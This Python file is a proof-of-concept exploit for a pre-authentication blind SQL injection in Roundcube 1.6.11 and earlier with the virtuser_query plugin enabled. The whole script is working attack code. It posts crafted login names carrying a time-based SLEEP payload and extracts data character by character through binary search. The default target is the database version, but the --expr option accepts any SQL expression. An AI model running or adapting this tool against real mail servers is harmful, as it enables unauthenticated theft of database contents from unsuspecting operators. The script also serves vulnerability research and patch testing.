#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Roundcube 1.6.11 - Pre-Auth SQL Injection PoC + DB version extractor
====================================================================

Target : Roundcube <= 1.6.11 with the `virtuser_query` plugin enabled and a
         `user` query configured, e.g.:

             $config['plugins'] = ['virtuser_query'];
             $config['virtuser_query'] = [
                 'user' => "SELECT username FROM users WHERE username = '%m'"
             ];

Bug    : plugins/virtuser_query/virtuser_query.php uses

             preg_replace('/%m/', $dbh->escape($p['email']), $query)

         `$dbh->escape()` escapes quotes/backslashes, but preg_replace()
         interprets backslashes in the *replacement* string, so a backslash
         in the login name collapses the escaping and lets SQL through.
         The `email2user` hook runs from rcmail::login() BEFORE authentication.

Usage  :
    # interactive: asks for the target URL
    python poc_preauth_sqli_roundcube_1611.py

    # non-interactive
    python poc_preauth_sqli_roundcube_1611.py --url http://127.0.0.1:8080

    # full error output (traceback + response body)
    python poc_preauth_sqli_roundcube_1611.py --url http://TARGET --debug

Output : confirms the blind SQLi, then extracts the database version
         (e.g. 8.0.46) character by character via time-based binary search.

Exit codes:
    0 = vulnerable + version extracted
    1 = no delay / not vulnerable (or plugin disabled)
    2 = hard error (connection, no login form, unexpected exception)
"""

import argparse
import http.cookiejar
import re
import sys
import time
import traceback
import urllib.error
import urllib.parse
import urllib.request

UA = "Mozilla/5.0 (Roundcube pre-auth SQLi PoC)"

# Windows consoles often use cp1252; force UTF-8 so localized error messages
# (e.g. Turkish "baÃ„Å¸lantÃ„Â±") don't raise UnicodeEncodeError.
try:
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
except Exception:
    pass


# --------------------------------------------------------------------------- #
# Error / response helpers
# --------------------------------------------------------------------------- #
class PocError(Exception):
    def __init__(self, message, status=None, url=None, body=None):
        super().__init__(message)
        self.status = status
        self.url = url
        self.body = body


class Resp:
    def __init__(self, status=-1, elapsed=0.0, body="", final_url="", error=None, tb=None):
        self.status = status
        self.elapsed = elapsed
        self.body = body
        self.final_url = final_url
        self.error = error
        self.tb = tb


def dump_resp(resp, debug=False, body_limit=600):
    print(f"    status      : {resp.status}")
    print(f"    final url   : {resp.final_url}")
    if resp.error:
        print(f"    error       : {resp.error}")
    if resp.tb and debug:
        print("    traceback   :")
        print(resp.tb)
    if resp.body:
        text = resp.body if debug else resp.body[:body_limit]
        print(f"    body        : {text!r}")


# --------------------------------------------------------------------------- #
# HTTP helpers
# --------------------------------------------------------------------------- #
def fetch_token(opener, base, debug=False):
    req = urllib.request.Request(base + "/", headers={"User-Agent": UA})
    try:
        r = opener.open(req, timeout=20)
        html = r.read().decode("utf-8", "replace")
        status, final = r.status, r.geturl()
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
        raise PocError(f"login page returned HTTP {e.code}", e.code, e.geturl(), body)
    except Exception as e:
        raise PocError(f"login page request failed: {type(e).__name__}: {e}",
                       None, base, traceback.format_exc())

    m = re.search(r'name="_token"\s+value="([^"]+)"', html)
    if not m:
        m = re.search(r'value="([^"]+)"[^>]*name="_token"', html)
    if not m:
        raise PocError("login form token not found (wrong URL? not Roundcube? "
                       "login page changed?)", status, final, html)

    if debug:
        print(f"[debug] GET {base}/ -> {status}, token {m.group(1)[:8]}...")
    return m.group(1)


def login_attempt(base, user, password, timeout=60):
    """POST the login form; returns a Resp with status/elapsed/body/error/tb."""
    jar = http.cookiejar.CookieJar()
    opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))
    t0 = time.time()
    try:
        token = fetch_token(opener, base)
    except PocError as e:
        return Resp(status=e.status if e.status is not None else -1,
                    elapsed=time.time() - t0,
                    body=e.body or "", final_url=e.url or "",
                    error=str(e), tb=None)

    data = urllib.parse.urlencode({
        "_token": token,
        "_task": "login",
        "_action": "login",
        "_timezone": "_default_",
        "_url": "",
        "_user": user,
        "_pass": password,
    }).encode()

    req = urllib.request.Request(
        base + "/?_task=login",
        data=data,
        headers={
            "User-Agent": UA,
            "Content-Type": "application/x-www-form-urlencoded",
        },
        method="POST",
    )

    t0 = time.time()
    try:
        r = opener.open(req, timeout=timeout)
        body = r.read().decode("utf-8", "replace")
        return Resp(r.status, time.time() - t0, body, r.geturl())
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
        return Resp(e.code, time.time() - t0, body, e.geturl())
    except Exception as e:
        return Resp(-1, time.time() - t0, "", "",
                    error=f"{type(e).__name__}: {e}",
                    tb=traceback.format_exc())


# --------------------------------------------------------------------------- #
# Injection oracle
# --------------------------------------------------------------------------- #
class Oracle:
    def __init__(self, base, user, password, sleep, margin, timeout,
                 debug=False, retries=2):
        self.base = base
        self.user = user
        self.password = password
        self.sleep = sleep
        self.margin = margin          # required delta over the calibrated baseline
        self.timeout = timeout
        self.debug = debug
        self.retries = retries
        self.requests = 0
        self.last_resp = None
        self.base_time = 0.0          # calibrated median baseline (seconds)

    def condition(self, cond):
        # IF(cond,SLEEP(n),1): true -> delay; false -> row returned (login ok)
        return f"{self.user}\\' AND IF({cond},SLEEP({self.sleep}),1)-- -"

    def test(self, cond):
        payload = self.condition(cond)
        for attempt in range(self.retries + 1):
            resp = login_attempt(self.base, payload, self.password, self.timeout)
            self.requests += 1
            self.last_resp = resp
            if resp.error:
                if self.debug:
                    print(f"[debug] request error (attempt {attempt + 1}): {resp.error}")
                    if resp.tb:
                        print(resp.tb)
                time.sleep(0.5)
                continue
            return resp.elapsed >= self.base_time + self.margin
        return False

    def raw_sleep(self):
        payload = f"{self.user}\\' AND SLEEP({self.sleep})-- -"
        self.last_resp = login_attempt(self.base, payload, self.password, self.timeout)
        self.requests += 1
        return self.last_resp

    def baseline(self):
        self.last_resp = login_attempt(self.base, self.user, self.password, self.timeout)
        self.requests += 1
        return self.last_resp


# --------------------------------------------------------------------------- #
# Blind extraction
# --------------------------------------------------------------------------- #
def extract_length(oracle, expr, max_len=64):
    lo, hi = 1, max_len
    while lo < hi:
        mid = (lo + hi) // 2
        if oracle.test(f"LENGTH(({expr}))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return lo


def extract_string(oracle, expr, length):
    out = []
    for pos in range(1, length + 1):
        lo, hi = 32, 126
        while lo < hi:
            mid = (lo + hi) // 2
            cond = f"ASCII(SUBSTRING(({expr}),{pos},1))>{mid}"
            if oracle.test(cond):
                lo = mid + 1
            else:
                hi = mid
        out.append(chr(lo))
        sys.stdout.write(f"\r[*] extracting   : {''.join(out)}")
        sys.stdout.flush()
    print()
    return "".join(out)


# --------------------------------------------------------------------------- #
# Main
# --------------------------------------------------------------------------- #
def run(args):
    if not args.url:
        try:
            args.url = input("Target URL (e.g. http://127.0.0.1:8080): ").strip()
        except EOFError:
            args.url = ""
    if not args.url:
        raise PocError("no target URL given")

    base = args.url.rstrip("/")
    if not re.match(r"^https?://", base):
        base = "http://" + base

    if "@" not in args.user:
        raise PocError("--user must contain '@' (the email2user pre-auth path "
                       "is only triggered for names with @)")

    margin = args.threshold if args.threshold is not None else max(1.0, args.sleep * 0.6)

    print(f"[*] target       : {base}")
    print(f"[*] login name   : {args.user}")
    print(f"[*] sleep        : {args.sleep}s (required delta/margin {margin:.2f}s)")

    oracle = Oracle(base, args.user, args.password, args.sleep, margin,
                    args.timeout, debug=args.debug)

    # 1) baseline calibration (3 samples, median) - guards against jitter/slow targets
    samples = []
    for i in range(3):
        r = oracle.baseline()
        if r.error:
            print(f"[!] baseline request {i + 1} failed:")
            dump_resp(r, debug=args.debug)
            raise PocError("cannot reach the login page: " + (r.error or "unknown"),
                           r.status, r.final_url, r.tb or r.body)
        samples.append(r.elapsed)
        print(f"[*] baseline {i + 1}   : status={r.status} time={r.elapsed:.2f}s")
    base_t = sorted(samples)[1]
    oracle.base_time = base_t
    print(f"[*] baseline med : {base_t:.2f}s")
    if base_t > 3.0:
        print(f"[!] high latency ({base_t:.1f}s); if the delta is unclear, retry with --sleep 5")

    # 2) sanity sleep
    inj_resp = oracle.raw_sleep()
    if inj_resp.error:
        print("[!] injection request failed:")
        dump_resp(inj_resp, debug=args.debug)
        raise PocError("injection request failed: " + (inj_resp.error or "unknown"),
                       inj_resp.status, inj_resp.final_url,
                       inj_resp.tb or inj_resp.body)
    print(f"[*] sleep test   : status={inj_resp.status} time={inj_resp.elapsed:.2f}s")
    delta = inj_resp.elapsed - base_t
    print(f"[*] delta        : {delta:+.2f}s (required {margin:.2f}s)")

    if delta < margin:
        print(f"[-] no reliable delay (delta {delta:+.2f}s < {margin:.2f}s). "
              f"Target may be patched, virtuser_query disabled, the SQL query differs, "
              f"or the link is too slow - try --sleep 5.")
        print("[!] last response (for debugging):")
        dump_resp(inj_resp, debug=args.debug)
        return 1
    print(f"[+] VULNERABLE: blind SQL injection confirmed (delta {delta:+.2f}s)")

    # 3) DB version length (cap: version strings are short)
    print("[*] extracting value length ...")
    length = extract_length(oracle, args.expr, max_len=32)
    print(f"[*] length       : {length}")
    if length >= 32 or length < 1:
        print("[-] length looks invalid (oracle unreliable or target not vulnerable); "
              "retry with --sleep 5")
        return 1

    # 4) DB version
    print("[*] extracting value ...")
    version = extract_string(oracle, args.expr, length)
    print(f"[+] extracted    : {version}")
    if set(version) <= {"~", " "} or any(ord(c) < 32 or ord(c) > 126 for c in version):
        print("[-] extracted value looks invalid (all '~' / non-printable). "
              "The oracle returned always-true; target likely not vulnerable or too slow.")
        return 1
    print(f"[*] requests     : {oracle.requests}")
    return 0


def main():
    p = argparse.ArgumentParser(
        description="Roundcube 1.6.11 pre-auth SQLi PoC + DB version extractor")
    p.add_argument("--url", help="base URL, e.g. http://host:8080 (asked if omitted)")
    p.add_argument("--user", default="test@example.com",
                   help="login name; must contain @ (default: test@example.com)")
    p.add_argument("--password", default="test", help="any password (auth is not the signal)")
    p.add_argument("--sleep", type=int, default=2, help="SLEEP seconds (default: 2)")
    p.add_argument("--threshold", type=float, default=None,
                   help="required delay delta over the calibrated baseline in seconds "
                        "(default: max(1.0, sleep*0.6))")
    p.add_argument("--timeout", type=int, default=60)
    p.add_argument("--expr", default="SELECT VERSION()",
                   help="SQL expression to extract (default: SELECT VERSION())")
    p.add_argument("--debug", action="store_true",
                   help="print full tracebacks, request errors and response bodies")
    args = p.parse_args()

    try:
        return run(args)
    except PocError as e:
        print(f"\n[!] ERROR: {e}")
        if e.status is not None:
            print(f"    status      : {e.status}")
        if e.url:
            print(f"    url         : {e.url}")
        if e.body:
            body = e.body if args.debug else str(e.body)[:600]
            print(f"    body        : {body!r}")
        if args.debug:
            print("\n[traceback]")
            print(traceback.format_exc())
        return 2
    except Exception:
        print("\n[!] UNEXPECTED ERROR - full traceback:")
        print(traceback.format_exc())
        return 2


if __name__ == "__main__":
    sys.exit(main())
